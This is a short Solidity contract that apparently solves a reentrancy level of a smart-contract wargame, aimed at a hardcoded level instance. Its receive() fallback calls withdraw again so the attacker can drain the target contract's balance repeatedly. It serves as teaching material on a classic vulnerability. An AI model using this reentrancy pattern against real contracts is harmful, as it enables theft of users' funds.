// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/level10.sol";

contract ReentranceAttack 
{
    Reentrance reentrance = Reentrance(0x2933F87404A19bBC37f9d92aee0d48F9baC73819);

    constructor() payable public {

    }

    function donate() public
    {
        reentrance.donate{value: 100000000000 wei}(address(this));
    }


    function withdraw() public
    {
        reentrance.withdraw(100000000000);
    }

    receive() external payable 
    {
        reentrance.withdraw(100000000000);
    }
}
